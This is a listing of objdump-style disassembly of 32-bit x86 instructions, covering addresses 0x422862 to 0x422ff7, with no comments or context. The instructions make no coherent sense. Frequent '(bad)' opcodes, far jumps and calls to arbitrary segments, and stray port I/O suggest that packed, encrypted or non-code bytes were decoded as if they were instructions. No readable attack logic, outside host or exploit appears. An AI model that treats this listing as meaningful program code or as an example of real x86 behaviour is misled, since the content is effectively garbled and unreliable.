  422862:	and    BYTE PTR [eax-0x646a920d],bl
  422868:	pushf  
  422869:	addr16 mov esi,0x6792603d
  42286f:	clc    
  422870:	retf   0x84f4
  422873:	jl     0x4228b3
  422875:	add    al,0x88
  422877:	mov    ebx,0x77bcc23f
  42287c:	jne    0x4228f1
  42287e:	jb     0x422875
  422880:	dec    esp
  422881:	test   DWORD PTR [edi-0x5c],edi
  422884:	leave  
  422885:	ins    BYTE PTR es:[edi],dx
  422886:	sbb    DWORD PTR gs:[edx+esi*8+0x292159],esp
  42288e:	sub    al,0xe
  422890:	mov    cl,0xff
  422892:	das    
  422893:	push   ebx
  422894:	jmp    0x1981:0x946446f9
  42289b:	adc    edx,DWORD PTR [esi+edx*1+0x6d]
  42289f:	xor    esp,ecx
  4228a1:	sbb    al,dh
  4228a3:	dec    eax
  4228a4:	neg    DWORD PTR [edi+0x226288e]
  4228aa:	(bad)  
  4228ac:	cs jae 0x4228d0
  4228af:	inc    edi
  4228b0:	jbe    0x4228b9
  4228b2:	(bad)  
  4228b3:	xchg   esp,eax
  4228b4:	clc    
  4228b5:	mov    ebp,0x42583f7d
  4228ba:	sbb    eax,0xe8bbd6d8
  4228bf:	setg   ah
  4228c2:	das    
  4228c3:	and    DWORD PTR [edi],edi
  4228c5:	inc    ecx
  4228c6:	je     0x422876
  4228c8:	arpl   WORD PTR [edi],bx
  4228ca:	in     al,0x21
  4228cc:	mov    eax,0xf312a526
  4228d1:	(bad)  
  4228d2:	cwde   
  4228d3:	je     0x422950
  4228d5:	out    0x73,al
  4228d7:	fldenv [ebx+0x22]
  4228da:	and    ebx,DWORD PTR [ecx-0x2496354d]
  4228e0:	mov    dh,0x7f
  4228e2:	push   edx
  4228e3:	or     DWORD PTR [edx+0x10],ebx
  4228e6:	stos   DWORD PTR es:[edi],eax
  4228e7:	cmp    DWORD PTR [edi+ebx*4+0x23],eax
  4228eb:	cli    
  4228ec:	and    al,0xa0
  4228ee:	xor    al,0x2a
  4228f0:	in     eax,0x61
  4228f2:	inc    ah
  4228f4:	(bad)  
  4228f5:	call   0x92cc:0x71c5fd25
  4228fc:	lahf   
  4228fd:	mov    ecx,DWORD PTR [esi-0x55273055]
  422903:	push   esp
  422904:	mov    al,0xd2
  422906:	jmp    0xa69b:0xadba9c02
  42290d:	xor    eax,0x43e3af00
  422912:	or     BYTE PTR [ebp-0x44],0x30
  422916:	gs dec edx
  422918:	jle    0x422967
  42291a:	lds    ecx,FWORD PTR [ecx-0x5]
  42291d:	xor    dl,BYTE PTR [ecx]
  42291f:	cmp    eax,0xd16a4a6a
  422924:	dec    esp
  422925:	dec    esi
  422926:	push   DWORD PTR ds:0x7a7016a4
  42292c:	sub    BYTE PTR [esi-0x59],0x2c
  422930:	jmp    0x42298d
  422932:	pop    ebp
  422933:	(bad)  
  422934:	icebp  
  422935:	push   eax
  422936:	xchg   DWORD PTR [eax-0x6e526e6b],esi
  42293c:	neg    BYTE PTR [eax+0x57cd3065]
  422942:	cmp    al,BYTE PTR [eax]
  422944:	add    BYTE PTR [eax],al
  422946:	add    BYTE PTR [eax],al
  422948:	add    BYTE PTR [eax],al
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	inc    edx
  422957:	pusha  
  422958:	or     eax,0x1b7d9cd
  42295d:	add    BYTE PTR [ecx+0x4c000006],al
  422963:	iret   
  422964:	jmp    0x422982
  422966:	pop    edx
  422967:	mov    es,esi
  422969:	cmp    BYTE PTR [ecx],al
  42296b:	push   eax
  42296c:	test   DWORD PTR [ebp+0x40],edx
  42296f:	pop    ss
  422970:	and    al,0xd1
  422972:	sbb    ah,cl
  422974:	push   esp
  422975:	mov    WORD PTR [esi-0x6c2b0f6d],?
  42297b:	mov    bh,0x82
  42297d:	mov    edx,ebp
  42297f:	jo     0x42294d
  422981:	jp     0x422954
  422983:	push   0x3f
  422985:	mov    gs,WORD PTR [esi]
  422987:	jge    0x422992
  422989:	dec    ebp
  42298a:	mov    esp,DWORD PTR [ebp-0x45704552]
  422990:	ret    0xa0b0
  422993:	and    DWORD PTR [esp+esi*4],ebx
  422996:	jbe    0x422988
  422998:	fst    st(6)
  42299a:	xlat   BYTE PTR ds:[ebx]
  42299b:	fsub   QWORD PTR [ebx]
  42299d:	and    al,0x25
  42299f:	push   cs
  4229a0:	daa    
  4229a1:	sbb    eax,0xf684cb67
  4229a6:	pop    ss
  4229a7:	cld    
  4229a8:	and    edi,DWORD PTR [edi]
  4229aa:	cmc    
  4229ab:	mov    dh,ch
  4229ad:	in     al,dx
  4229ae:	jl     0x422932
  4229b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229b1:	cmc    
  4229b2:	mov    esi,0x29bc5ff5
  4229b7:	arpl   bx,cx
  4229b9:	in     eax,0xaa
  4229bb:	mov    BYTE PTR [esi],ch
  4229bd:	jg     0x4229fe
  4229bf:	xor    BYTE PTR [ecx+0x37],dh
  4229c2:	and    ebp,DWORD PTR [esi+edi*2+0x504b4bfd]
  4229c9:	xchg   ecx,eax
  4229ca:	mov    dl,0xad
  4229cc:	xchg   ebp,eax
  4229cd:	sub    eax,0x150e547f
  4229d2:	xor    al,0xbf
  4229d4:	sub    al,0xb
  4229d6:	pop    ebx
  4229d7:	mov    WORD PTR [eax+0x1f126462],ss
  4229dd:	pop    esp
  4229de:	cmp    eax,0x6646a5b1
  4229e3:	and    DWORD PTR [edx],edi
  4229e5:	xchg   esi,eax
  4229e6:	jg     0x422995
  4229e8:	in     al,dx
  4229e9:	lea    edx,[esi+0x4c]
  4229ec:	xor    al,0x88
  4229ee:	(bad)  
  4229ef:	mov    bh,0xc8
  4229f1:	dec    ebp
  4229f2:	dec    esi
  4229f3:	adc    al,0xe5
  4229f5:	add    BYTE PTR [edi+0x71],0x14
  4229f9:	into   
  4229fa:	(bad)  
  4229fb:	pop    ebx
  4229fc:	and    al,0x37
  4229fe:	ins    DWORD PTR es:[edi],dx
  4229ff:	idiv   DWORD PTR [edx+0x65]
  422a02:	add    DWORD PTR [eax+0x2897d366],ecx
  422a08:	push   ecx
  422a09:	mov    dl,0xcd
  422a0b:	mov    ebx,esp
  422a0d:	mov    BYTE PTR [ebx+0x2e97cbd],dh
  422a13:	dec    ecx
  422a14:	out    0xeb,al
  422a16:	inc    ecx
  422a17:	mov    ds:0xc8216cb2,eax
  422a1c:	stos   DWORD PTR es:[edi],eax
  422a1d:	loope  0x422a76
  422a1f:	dec    edi
  422a20:	jle    0x422a1c
  422a22:	mov    edi,DWORD PTR [eax+ebp*2-0x4c]
  422a26:	das    
  422a27:	ins    BYTE PTR es:[edi],dx
  422a28:	jne    0x422a59
  422a2a:	jbe    0x422a84
  422a2c:	jmp    0x63d0e9b6
  422a31:	push   ecx
  422a32:	pop    ebp
  422a33:	or     DWORD PTR [ebx],ecx
  422a35:	push   esi
  422a36:	(bad)  
  422a37:	cmc    
  422a38:	test   eax,0x629a89ec
  422a3d:	sar    DWORD PTR [ecx],cl
  422a3f:	mov    ecx,0x3fb4b2f0
  422a44:	xchg   esi,eax
  422a45:	xchg   ebp,eax
  422a46:	xor    al,0x3b
  422a48:	and    cl,bl
  422a4a:	popf   
  422a4b:	adc    ebx,ebp
  422a4d:	or     eax,0xedc52461
  422a52:	add    BYTE PTR ds:0x709c7e74,bl
  422a58:	es pop edx
  422a5a:	sbb    al,0x9b
  422a5c:	add    DWORD PTR [ebp-0x28597518],ebp
  422a62:	sub    esi,DWORD PTR [ebx]
  422a64:	icebp  
  422a65:	nop
  422a66:	jmp    0x422a7f
  422a68:	or     al,0xaf
  422a6a:	ja     0x422ab2
  422a6c:	repz enter 0xf309,0x3c
  422a71:	sub    BYTE PTR [ebx+0x3716af8c],0x66
  422a78:	dec    edi
  422a79:	mov    esp,0x81cbef75
  422a7e:	fld    TBYTE PTR ds:0xb09e8ee9
  422a84:	jo     0x422adf
  422a86:	sbb    eax,0xbc7b6d13
  422a8b:	daa    
  422a8c:	jbe    0x422a6e
  422a8e:	out    dx,al
  422a8f:	mov    edi,0x2d8019be
  422a94:	cmp    BYTE PTR [esi],bl
  422a96:	ins    DWORD PTR es:[edi],dx
  422a97:	and    edi,DWORD PTR [esp+edi*2+0x60ec5f08]
  422a9e:	mov    edi,ebp
  422aa0:	leave  
  422aa1:	movmskps edi,xmm0
  422aa4:	and    BYTE PTR [edx+0x2d],ch
  422aa7:	xlat   BYTE PTR ds:[ebx]
  422aa8:	add    edx,eax
  422aaa:	loop   0x422a8c
  422aac:	push   esp
  422aad:	lods   al,BYTE PTR ds:[esi]
  422aae:	push   0xe664f047
  422ab3:	cmp    edx,DWORD PTR [eax]
  422ab5:	loope  0x422a65
  422ab7:	push   ebp
  422ab8:	into   
  422ab9:	xor    DWORD PTR [eax+0x31],esp
  422abc:	punpckhbw mm5,QWORD PTR [ecx+0x4f30527]
  422ac3:	ja     0x422abf
  422ac5:	outs   dx,BYTE PTR ds:[esi]
  422ac6:	mov    cl,0x6c
  422ac8:	cmp    DWORD PTR ds:0x3a9a2577,edi
  422ace:	out    0xa2,eax
  422ad0:	jg     0x422aef
  422ad2:	pop    esi
  422ad3:	inc    ebx
  422ad4:	call   0x93550451
  422ad9:	outs   dx,BYTE PTR ds:[esi]
  422ada:	fstp   TBYTE PTR [ebp+0x55ec3490]
  422ae0:	or     eax,0x510a06ed
  422ae5:	frstor [ebx-0x619f4e03]
  422aeb:	loope  0x422ac0
  422aed:	rol    BYTE PTR [eax+0x15501140],cl
  422af3:	cmc    
  422af4:	inc    ebp
  422af5:	aad    0xdd
  422af7:	out    0x3a,al
  422af9:	mov    eax,0x7f4cd0a2
  422afe:	jmp    0xd8b4:0xb199f492
  422b05:	mov    al,ds:0xdd6a4b1
  422b0a:	xor    bh,cl
  422b0c:	mov    ch,0x90
  422b0e:	pusha  
  422b0f:	mov    dl,0xc3
  422b11:	sbb    esi,DWORD PTR [ebx+ecx*2+0x7]
  422b15:	cmp    al,0x34
  422b17:	outs   dx,DWORD PTR ds:[esi]
  422b18:	mov    BYTE PTR [edx-0x47],ch
  422b1b:	out    dx,al
  422b1c:	out    dx,al
  422b1d:	out    dx,al
  422b1e:	mov    edx,0x3d3cf817
  422b23:	outs   dx,BYTE PTR ds:[esi]
  422b24:	adc    ebx,DWORD PTR [edi-0x26]
  422b27:	jl     0x422b5e
  422b29:	dec    eax
  422b2a:	inc    esi
  422b2b:	imul   ebp,DWORD PTR [eax+0x11],0x69168749
  422b32:	pop    ebp
  422b33:	js     0x422ae9
  422b35:	inc    esi
  422b36:	cwde   
  422b37:	pop    ebx
  422b38:	loopne 0x422b30
  422b3a:	retf   0xc1df
  422b3d:	(bad)  
  422b3e:	jmp    0xadeb:0xb379912c
  422b45:	shl    DWORD PTR [ecx-0xb],0xf
  422b49:	jns    0x422b82
  422b4b:	scas   eax,DWORD PTR es:[edi]
  422b4c:	fadd   DWORD PTR [ebx+0x26]
  422b4f:	and    eax,0x3044ec52
  422b54:	push   0xd49a58a7
  422b59:	cdq    
  422b5a:	mov    ebp,0xf128075
  422b5f:	ins    DWORD PTR es:[edi],dx
  422b60:	out    0x11,eax
  422b62:	push   0xed55000a
  422b67:	and    eax,0x26a28330
  422b6c:	das    
  422b6d:	mov    ebp,0xa3455f66
  422b72:	xchg   edx,eax
  422b73:	mov    eax,ds:0xa51479ab
  422b78:	xor    BYTE PTR [edx-0x9deea6a],al
  422b7e:	and    al,0x2e
  422b80:	dec    esi
  422b81:	sbb    eax,0xb5dff428
  422b86:	jmp    0x422c05
  422b88:	or     cl,BYTE PTR [ecx]
  422b8a:	mov    ecx,0xa2b042c6
  422b8f:	idiv   BYTE PTR [eax+0x18fa0694]
  422b95:	pop    edx
  422b96:	sub    DWORD PTR [ebx+0x72],0xffffff8f
  422b9a:	imul   DWORD PTR [edi]
  422b9c:	xchg   edx,eax
  422b9d:	sbb    ecx,ebp
  422b9f:	cmc    
  422ba0:	sub    al,0x4c
  422ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ba3:	into   
  422ba4:	mov    al,0x89
  422ba6:	retf   
  422ba7:	pop    ebp
  422ba8:	sub    dh,bl
  422baa:	jg     0x422bb6
  422bac:	clc    
  422bad:	adc    cl,BYTE PTR [ebp-0x439b0211]
  422bb3:	sbb    edi,0xece08b65
  422bb9:	cmp    DWORD PTR [ecx+0x2c],esp
  422bbc:	gs sbb al,0x10
  422bbf:	enter  0xddb2,0xe2
  422bc3:	sub    dl,BYTE PTR [edi]
  422bc5:	mov    esi,0x34736b64
  422bca:	aad    0xc4
  422bcc:	xor    esp,ecx
  422bce:	arpl   WORD PTR [ecx],bp
  422bd0:	fst    DWORD PTR [eax]
  422bd2:	jne    0x422ba9
  422bd4:	push   esp
  422bd5:	stc    
  422bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bd7:	int3   
  422bd8:	pop    ecx
  422bd9:	lods   al,BYTE PTR ds:[esi]
  422bda:	xchg   DWORD PTR [eax-0x2c],eax
  422bdd:	mov    ds:0xad9a2625,eax
  422be2:	out    dx,eax
  422be3:	out    dx,eax
  422be4:	out    dx,al
  422be5:	mov    bl,0xfa
  422be7:	int    0x48
  422be9:	repnz and al,0xf5
  422bec:	dec    edx
  422bed:	mov    WORD PTR [ebp+0x44],ds
  422bf0:	ret    0xe7c
  422bf3:	inc    ecx
  422bf4:	scas   eax,DWORD PTR es:[edi]
  422bf5:	shl    ebp,0xd1
  422bf8:	enter  0xdbec,0x31
  422bfc:	imul   esp,DWORD PTR [edi-0x7],0x66
  422c00:	sub    al,0x33
  422c02:	imul   eax,DWORD PTR [ebp+0x5a40541b],0xffffffd7
  422c09:	ins    BYTE PTR es:[edi],dx
  422c0a:	mov    edx,0x756dc66
  422c0f:	stos   BYTE PTR es:[edi],al
  422c10:	fld    TBYTE PTR [eax-0x6dce90df]
  422c16:	aaa    
  422c17:	rcl    BYTE PTR [ecx],1
  422c19:	sti    
  422c1a:	and    al,BYTE PTR [ecx+0x3]
  422c1d:	in     eax,dx
  422c1e:	cwde   
  422c1f:	nop
  422c20:	sub    al,0xcb
  422c22:	(bad)  
  422c23:	std    
  422c24:	(bad)  
  422c25:	push   cs
  422c26:	mov    al,ds:0xcd520a8f
  422c2b:	cli    
  422c2c:	dec    ebx
  422c2d:	mov    ds:0x930a4df5,al
  422c32:	mov    WORD PTR [eax+0x4c1c92fa],?
  422c38:	adc    BYTE PTR [ebx],bl
  422c3a:	div    ah
  422c3c:	xchg   ecx,eax
  422c3d:	pop    esp
  422c3e:	mov    edi,DWORD PTR [ebx+0x2ad7aa0c]
  422c44:	mov    dh,0xb8
  422c46:	stc    
  422c47:	out    0xec,al
  422c49:	add    eax,0xb3a8e600
  422c4e:	add    BYTE PTR [ecx-0x11],ah
  422c51:	sti    
  422c52:	jmp    0x872b0d40
  422c57:	icebp  
  422c58:	jne    0x422cbd
  422c5a:	repz sbb al,0x1
  422c5d:	mov    cl,0xa6
  422c5f:	mov    ebx,0xb5eccf48
  422c64:	or     al,0xb5
  422c66:	popf   
  422c67:	shr    BYTE PTR [eax+0x78],0xf3
  422c6b:	inc    eax
  422c6c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  422c6e:	(bad)  [esi+eiz*2]
  422c71:	cmc    
  422c72:	jno    0x422c79
  422c74:	lock xchg DWORD PTR [ebp+0x6a],esp
  422c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c79:	push   esp
  422c7a:	and    eax,0x6f4d2024
  422c7f:	ret    
  422c80:	mov    esp,0xfe9b40cb
  422c85:	retf   
  422c86:	xchg   esi,eax
  422c87:	(bad)  [ebp+0xa]
  422c8a:	adc    DWORD PTR [ecx-0x52],esp
  422c8d:	push   ss
  422c8e:	add    DWORD PTR [ecx+edi*1+0x42],edi
  422c92:	push   ebp
  422c93:	push   edx
  422c94:	pushf  
  422c95:	xlat   BYTE PTR ds:[ebx]
  422c96:	lods   al,BYTE PTR ds:[esi]
  422c97:	cmp    al,0x5a
  422c99:	lahf   
  422c9a:	retf   0x858f
  422c9d:	push   0x63
  422c9f:	outs   dx,WORD PTR ds:[esi]
  422ca1:	gs es hlt 
  422ca4:	sub    BYTE PTR [esi+0x5a],0x46
  422ca8:	clc    
  422ca9:	int    0x37
  422cab:	fld    DWORD PTR [edi-0x11]
  422cae:	sbb    ch,bh
  422cb0:	stc    
  422cb1:	dec    esi
  422cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cb3:	sub    DWORD PTR [ecx+eiz*4+0x609cc51a],edx
  422cba:	bound  eax,QWORD PTR [eax-0x37]
  422cbd:	leave  
  422cbe:	out    dx,al
  422cbf:	jmp    0xca2d2ac4
  422cc4:	ret    0x1bda
  422cc7:	pop    ss
  422cc8:	outs   dx,DWORD PTR ds:[esi]
  422cc9:	mov    bl,0x56
  422ccb:	xchg   esp,eax
  422ccc:	inc    edi
  422ccd:	xchg   esp,eax
  422cce:	sti    
  422ccf:	lahf   
  422cd0:	cwde   
  422cd1:	jne    0x422cf6
  422cd3:	adc    eax,0xa537e34c
  422cd8:	pop    ecx
  422cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cda:	out    0x65,eax
  422cdc:	aam    0xd4
  422cde:	dec    esi
  422cdf:	mov    eax,ds:0x99c90d64
  422ce4:	push   0xa2bb6226
  422ce9:	jl     0x422c8f
  422ceb:	(bad)  
  422cec:	std    
  422ced:	xor    ebp,ebp
  422cef:	or     BYTE PTR [ebx-0x67cab1be],dl
  422cf5:	cmp    ebx,DWORD PTR [eax+0x50]
  422cf8:	in     eax,dx
  422cf9:	jl     0x422d70
  422cfb:	(bad)  
  422cfc:	sti    
  422cfd:	int3   
  422cfe:	pop    eax
  422cff:	jl     0x422ccf
  422d01:	or     eax,DWORD PTR [edi]
  422d03:	mov    edi,DWORD PTR [ebp-0xd]
  422d06:	js     0x422d26
  422d08:	jl     0x422c8b
  422d0a:	dec    ebx
  422d0b:	xor    al,0x1b
  422d0d:	sub    bh,dh
  422d0f:	in     eax,dx
  422d10:	mov    ds:0xc455a26b,eax
  422d15:	jmp    0xda8b:0x6c76a80d
  422d1c:	mov    ebx,0xd46c45ce
  422d21:	(bad)
  422d25:	sahf   
  422d26:	inc    esi
  422d27:	cmp    BYTE PTR [edi+0x6502bfc6],0x64
  422d2e:	sar    DWORD PTR [edi-0x65],0x1a
  422d32:	and    eax,0xf8b1ebd3
  422d37:	sti    
  422d38:	mov    esp,?
  422d3a:	(bad)  
  422d3b:	int3   
  422d3c:	push   esi
  422d3d:	std    
  422d3e:	les    eax,FWORD PTR [ecx+0x72]
  422d41:	inc    edi
  422d42:	jnp    0x422d06
  422d44:	sub    BYTE PTR [ebx],al
  422d46:	jecxz  0x422da4
  422d48:	fcom   DWORD PTR [esi+0x16]
  422d4b:	stos   BYTE PTR es:[edi],al
  422d4c:	push   edx
  422d4d:	mov    BYTE PTR [edi+0x12],0xf
  422d51:	mov    cl,BYTE PTR [edx]
  422d53:	push   0x2f
  422d55:	cdq    
  422d56:	or     DWORD PTR [edi],edi
  422d58:	int    0x15
  422d5a:	cmp    al,0x62
  422d5c:	(bad)  
  422d5d:	mov    bl,BYTE PTR [eax+0x4e410487]
  422d63:	out    dx,al
  422d64:	std    
  422d65:	inc    ebx
  422d66:	push   ebx
  422d67:	dec    edx
  422d68:	aam    0xfc
  422d6a:	jno    0x422dda
  422d6c:	add    eax,DWORD PTR [edi-0x8381aca]
  422d72:	pop    ebp
  422d73:	xchg   DWORD PTR [ecx+ebx*2-0x1794c0ff],edx
  422d7a:	jle    0x422d77
  422d7c:	or     eax,0x33a685d9
  422d81:	stos   DWORD PTR es:[edi],eax
  422d82:	int    0x82
  422d84:	mov    ah,0xeb
  422d86:	into   
  422d87:	call   FWORD PTR [ebx]
  422d89:	mov    ebx,ecx
  422d8b:	jge    0x422de6
  422d8d:	push   edx
  422d8e:	icebp  
  422d8f:	outs   dx,DWORD PTR ds:[esi]
  422d90:	adc    cl,0x91
  422d93:	mov    eax,ds:0xdb531c1c
  422d98:	pop    esp
  422d99:	pop    ebx
  422d9a:	outs   dx,DWORD PTR ds:[esi]
  422d9b:	mov    bl,0xce
  422d9d:	add    BYTE PTR [edi+eiz*4],bl
  422da0:	mov    ebp,0xb7e7f704
  422da5:	leave  
  422da6:	sub    al,0x70
  422da8:	(bad)  
  422da9:	xchg   edi,eax
  422daa:	dec    ebp
  422dab:	jmp    0xe6020db2
  422db0:	mov    ah,0xc8
  422db2:	fcmove st,st(5)
  422db4:	push   edi
  422db5:	jbe    0x422e31
  422db7:	or     eax,0x13e377f6
  422dbc:	or     bh,dh
  422dbe:	cld    
  422dbf:	inc    esp
  422dc0:	aas    
  422dc1:	and    esi,esi
  422dc3:	cwde   
  422dc4:	xlat   BYTE PTR ds:[ebx]
  422dc5:	inc    edx
  422dc6:	add    ebx,edi
  422dc8:	and    DWORD PTR [ecx],0xbf8c4d53
  422dce:	dec    ebp
  422dcf:	inc    edi
  422dd0:	and    BYTE PTR [ebx],dl
  422dd2:	dec    esp
  422dd3:	sub    al,0xa8
  422dd5:	sbb    DWORD PTR [eax+eiz*4],edx
  422dd8:	stc    
  422dd9:	adc    dl,dl
  422ddb:	sbb    al,0x58
  422ddd:	lods   al,BYTE PTR ds:[esi]
  422dde:	sub    eax,0x68835fa6
  422de3:	jl     0x422e0e
  422de5:	fiadd  DWORD PTR [ebx]
  422de7:	pop    edi
  422de8:	dec    eax
  422de9:	dec    ebx
  422dea:	pop    edx
  422deb:	lock outs dx,BYTE PTR ds:[esi]
  422ded:	jl     0x422e31
  422def:	cmp    al,BYTE PTR [ecx+0x74]
  422df2:	xchg   DWORD PTR [ebp-0x7cb9caf4],esp
  422df8:	aas    
  422df9:	sub    dh,BYTE PTR [ebx]
  422dfb:	push   eax
  422dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dfd:	retf   0x67a7
  422e00:	sbb    ebx,DWORD PTR [ecx+0x73f242c6]
  422e06:	add    ch,BYTE PTR [edi+0xa]
  422e09:	pop    edx
  422e0a:	sbb    esp,DWORD PTR [esp+eax*4-0xe0cccf2]
  422e11:	dec    ebx
  422e12:	or     BYTE PTR [ebp+0x6f830671],dl
  422e18:	daa    
  422e19:	mov    eax,ds:0xbeb4b38e
  422e1e:	rol    dl,0xc7
  422e21:	out    0xc,eax
  422e23:	cli    
  422e24:	ins    DWORD PTR es:[edi],dx
  422e25:	je     0x422e05
  422e27:	iret   
  422e28:	stos   BYTE PTR es:[edi],al
  422e29:	pusha  
  422e2a:	xchg   DWORD PTR [ebp+0x49],ecx
  422e2d:	pop    esi
  422e2e:	xor    al,0x17
  422e30:	xchg   edx,eax
  422e31:	mov    ebx,0x284c2e09
  422e36:	ss jns 0x422e3e
  422e39:	pop    ebp
  422e3a:	in     eax,0xbf
  422e3c:	fsub   st(5),st
  422e3e:	outs   dx,DWORD PTR ds:[esi]
  422e3f:	inc    edi
  422e40:	ficom  DWORD PTR [eax-0x3f2701d1]
  422e46:	ins    BYTE PTR es:[edi],dx
  422e47:	aad    0xe8
  422e49:	test   DWORD PTR [eax-0x62],edi
  422e4c:	sub    edi,DWORD PTR [edi+0xb83bbd1]
  422e52:	into   
  422e53:	sar    DWORD PTR [ebx],1
  422e55:	dec    ebp
  422e56:	shl    BYTE PTR [esi-0x6f],1
  422e59:	jo     0x422dfe
  422e5b:	sbb    DWORD PTR [edx+0x73caa161],ebx
  422e61:	pushf  
  422e62:	cld    
  422e63:	test   DWORD PTR [edi-0x36a3b525],eax
  422e69:	mov    esp,0x2834267f
  422e6e:	and    DWORD PTR [edi],esp
  422e70:	push   esi
  422e71:	mov    ecx,0x61659ae5
  422e76:	xor    eax,0x7afa457c
  422e7b:	in     eax,dx
  422e7c:	and    eax,DWORD PTR [edi+0x76]
  422e7f:	jne    0x422e60
  422e81:	xchg   edi,esi
  422e83:	das    
  422e84:	shl    BYTE PTR [esi-0x462845cb],0x83
  422e8b:	fdivr  QWORD PTR [edx-0x54c6c848]
  422e91:	mov    ch,0x17
  422e93:	(bad)  
  422e94:	push   edx
  422e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e96:	mov    dh,cl
  422e98:	popf   
  422e99:	out    0xff,al
  422e9b:	aas    
  422e9c:	push   esi
  422e9d:	imul   eax,DWORD PTR [ecx]
  422ea0:	imul   eax,DWORD PTR [ebx-0x76],0xf
  422ea4:	push   eax
  422ea5:	lds    esp,FWORD PTR [edx+eax*4]
  422ea8:	sub    al,0x1a
  422eaa:	or     DWORD PTR [edi],ecx
  422eac:	(bad)
  422eaf:	add    al,BYTE PTR [esi]
  422eb1:	xchg   esp,eax
  422eb2:	repnz and eax,0x5df33752
  422eb8:	imul   esi,eax,0x79
  422ebb:	sahf   
  422ebc:	add    esi,DWORD PTR [edi]
  422ebe:	and    BYTE PTR [edi-0x7d930eb0],cl
  422ec4:	cmp    BYTE PTR [ebx-0x6e74b0ce],bl
  422eca:	and    BYTE PTR [ebx-0x7376f0ca],0xe8
  422ed1:	imul   eax,DWORD PTR [ebp+0x72],0x900286c
  422ed8:	adc    al,0x77
  422eda:	pop    ebx
  422edb:	xor    al,0x6c
  422edd:	ss push esp
  422edf:	lahf   
  422ee0:	inc    esp
  422ee1:	xchg   esp,eax
  422ee2:	pop    eax
  422ee3:	icebp  
  422ee4:	push   ss
  422ee5:	pop    edx
  422ee6:	sar    DWORD PTR [eax+0x30],0xf6
  422eea:	fild   DWORD PTR [edx]
  422eec:	adc    al,0xd6
  422eee:	(bad)  
  422eef:	sbb    eax,0x2bec893d
  422ef4:	aad    0x95
  422ef6:	lods   eax,DWORD PTR ds:[esi]
  422ef7:	push   eax
  422ef8:	call   0xe2c4:0xb50f3375
  422eff:	faddp  st(2),st
  422f01:	out    0x25,al
  422f03:	fwait
  422f04:	inc    eax
  422f05:	test   edi,ebx
  422f07:	jmp    0x44f5:0xcc1597b6
  422f0e:	cmp    ah,BYTE PTR [esi]
  422f10:	scas   eax,DWORD PTR es:[edi]
  422f11:	int3   
  422f12:	call   0x8a834fd1
  422f17:	js     0x422f6f
  422f19:	adc    DWORD PTR [ecx+0x3a2eaab7],ebx
  422f1f:	cs iret 
  422f21:	test   BYTE PTR [ecx],0x12
  422f24:	(bad)  
  422f26:	mov    DWORD PTR [ebp+0x12],ebx
  422f29:	push   ds
  422f2a:	sub    BYTE PTR [edi+0x33],0x2b
  422f2e:	loope  0x422f94
  422f30:	fwait
  422f31:	mov    ecx,ebx
  422f33:	jmp    0xd1c6a56b
  422f38:	xor    al,0xe3
  422f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f3b:	jo     0x422f1f
  422f3d:	or     al,BYTE PTR [edx]
  422f3f:	clc    
  422f40:	pop    esi
  422f41:	(bad)  
  422f42:	retf   0xad4
  422f45:	dec    ebp
  422f46:	dec    edx
  422f47:	mov    esi,0x3e9773f5
  422f4c:	pop    esp
  422f4d:	stos   DWORD PTR es:[edi],eax
  422f4e:	popf   
  422f4f:	push   0xed1996ed
  422f54:	push   ebx
  422f55:	dec    ebx
  422f56:	jbe    0x422f77
  422f58:	jo     0x422fd0
  422f5a:	idiv   BYTE PTR [ebx]
  422f5c:	xchg   edi,eax
  422f5d:	and    al,0x13
  422f5f:	ret    
  422f60:	mov    bh,0x54
  422f62:	cmp    esi,0x45fb5be9
  422f68:	pop    ds
  422f69:	adc    BYTE PTR [ecx+0x40e7a7ef],0x61
  422f70:	push   ds
  422f71:	sti    
  422f72:	push   cs
  422f73:	jmp    0x422f43
  422f75:	mov    ch,al
  422f77:	fdiv   QWORD PTR [eax]
  422f79:	push   eax
  422f7a:	imul   ecx,DWORD PTR [ecx],0xdb3d722c
  422f80:	out    0xe1,al
  422f82:	push   ecx
  422f83:	or     al,0x4b
  422f85:	or     DWORD PTR [esi+ecx*4+0x6e],0x79
  422f8a:	call   0xcda:0x256f292
  422f91:	loopne 0x422fad
  422f93:	push   cs
  422f94:	enter  0xa81a,0x8d
  422f98:	adc    cl,BYTE PTR [esi-0x5a86aba3]
  422f9e:	ja     0x422f42
  422fa0:	imul   BYTE PTR [esi*4+0x563b1a7d]
  422fa7:	iret   
  422fa8:	adc    ecx,DWORD PTR [eax-0x2cdaf69f]
  422fae:	inc    ebx
  422faf:	or     esp,edi
  422fb1:	add    ecx,DWORD PTR [ebx-0x62]
  422fb4:	sub    al,0xda
  422fb6:	mov    cl,0x36
  422fb8:	jb     0x422fdd
  422fba:	ret    
  422fbb:	dec    eax
  422fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbd:	sub    eax,0x19829c0b
  422fc2:	mov    ?,WORD PTR [edi-0x46f73984]
  422fc8:	fcom   DWORD PTR ds:0x60d02ed5
  422fce:	mov    eax,0xcd6426d2
  422fd3:	xor    BYTE PTR [edx],ah
  422fd5:	sar    DWORD PTR [eax-0x60],1
  422fd8:	jmp    DWORD PTR [esi]
  422fda:	xchg   DWORD PTR [ecx+0x5474d4b6],esi
  422fe0:	iret   
  422fe1:	jmp    0x0:0x17
  422fe8:	add    BYTE PTR [eax],al
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422ff7
  422ff7:	xlat   BYTE PTR ds:[ebx]
